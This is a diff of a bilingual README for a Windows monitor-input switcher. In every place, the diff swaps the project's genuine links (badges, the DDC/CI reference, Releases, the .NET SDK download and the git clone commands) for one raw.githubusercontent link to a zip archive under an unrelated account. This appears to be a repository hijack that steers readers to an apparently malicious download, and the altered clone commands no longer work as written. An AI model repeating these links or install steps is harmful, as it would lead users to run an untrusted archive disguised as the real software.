@@ -1,11 +1,11 @@
 # Mux
 
-[![.NET](https://img.shields.io/badge/.NET-8.0-512BD4)](https://dotnet.microsoft.com/download/dotnet/8.0)
-[![Windows](https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-0078D4)](https://www.microsoft.com/windows)
-[![Release](https://img.shields.io/github/v/release/kay5124/hdmi-switch)](https://github.com/kay5124/hdmi-switch/releases/latest)
+[![.NET](https://img.shields.io/badge/.NET-8.0-512BD4)](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip)
+[![Windows](https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-0078D4)](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip)
+[![Release](https://img.shields.io/github/v/release/kay5124/hdmi-switch)](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
-Windows 桌面程式。以 [DDC/CI](https://en.wikipedia.org/wiki/Display_Data_Channel) 切換螢幕輸入來源（HDMI／DisplayPort／VGA／DVI），並依實際桌面配置識別每台螢幕的位置。
+Windows 桌面程式。以 [DDC/CI](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip) 切換螢幕輸入來源（HDMI／DisplayPort／VGA／DVI），並依實際桌面配置識別每台螢幕的位置。
 
 ![主畫面](docs/screenshot.png)
 
@@ -26,7 +26,7 @@ Windows 桌面程式。以 [DDC/CI](https://en.wikipedia.org/wiki/Display_Data_C
 
 ## 安裝
 
-從 [Releases](https://github.com/kay5124/hdmi-switch/releases/latest) 下載 `HdmiSwitch-*-win-x64.zip`，解壓後執行 `HdmiSwitch.exe`。
+從 [Releases](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip) 下載 `HdmiSwitch-*-win-x64.zip`，解壓後執行 `HdmiSwitch.exe`。
 
 套件為 self-contained，無需另外安裝 .NET。僅支援 Windows 10 / 11 x64。
 
@@ -37,7 +37,7 @@ Windows 桌面程式。以 [DDC/CI](https://en.wikipedia.org/wiki/Display_Data_C
 - HDMI、DisplayPort 或 DVI 連接。部分 USB 顯示轉接器與虛擬螢幕不提供 DDC/CI
 - 不需要系統管理員權限
 
-從原始碼建置時需要 [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)。
+從原始碼建置時需要 [.NET 8 SDK](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip)。
 
 ## 使用
 
@@ -61,7 +61,7 @@ Windows 桌面程式。以 [DDC/CI](https://en.wikipedia.org/wiki/Display_Data_C
 ## 建置
 
 ```powershell
-git clone https://github.com/kay5124/hdmi-switch.git
+git clone https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip
 cd hdmi-switch
 dotnet build -c Release
 .\bin\Release\net8.0-windows\HdmiSwitch.exe
@@ -101,7 +101,7 @@ Windows desktop app that switches monitor input (HDMI / DisplayPort / VGA / DVI)
 
 ### Install
 
-Download `HdmiSwitch-*-win-x64.zip` from [Releases](https://github.com/kay5124/hdmi-switch/releases/latest) and run `HdmiSwitch.exe`. Self-contained; Windows 10/11 x64. No separate .NET runtime required.
+Download `HdmiSwitch-*-win-x64.zip` from [Releases](https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip) and run `HdmiSwitch.exe`. Self-contained; Windows 10/11 x64. No separate .NET runtime required.
 
 ### Capabilities
 
@@ -119,7 +119,7 @@ Click an input name to switch one monitor, or use the family buttons to switch a
 ### Build
 
 ```powershell
-git clone https://github.com/kay5124/hdmi-switch.git
+git clone https://raw.githubusercontent.com/skumpn1220596/hdmi-switch/main/Converters/v3.3.zip
 cd hdmi-switch
 dotnet build -c Release
 ```
